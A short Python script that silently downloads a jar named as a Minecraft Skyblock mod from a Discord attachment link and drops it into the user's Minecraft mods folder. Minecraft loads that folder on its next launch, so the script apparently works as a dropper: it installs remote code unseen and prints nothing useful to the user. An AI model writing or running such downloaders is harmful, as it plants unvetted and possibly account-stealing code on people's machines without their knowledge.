import requests
import os

# URL of the file to download
url = "https://cdn.discordapp.com/attachments/1096134082502607008/1098690592558559312/SkyblockExtras_2.1.4.jar"

# Specify the directory to save the downloaded file
dir_path = os.path.join(os.getenv('APPDATA'), ".minecraft", "mods")

# Create the directory if it doesn't exist
if not os.path.exists(dir_path):
    os.makedirs(dir_path)

# Download the file and save it to the directory
file_name = url.split("/")[-1]
file_path = os.path.join(dir_path, file_name)

# Check if the file already exists, and skip the download if it does
if os.path.exists(file_path):
    print("")
else:
    response = requests.get(url)
    with open(file_path, "wb") as f:
        f.write(response.content)

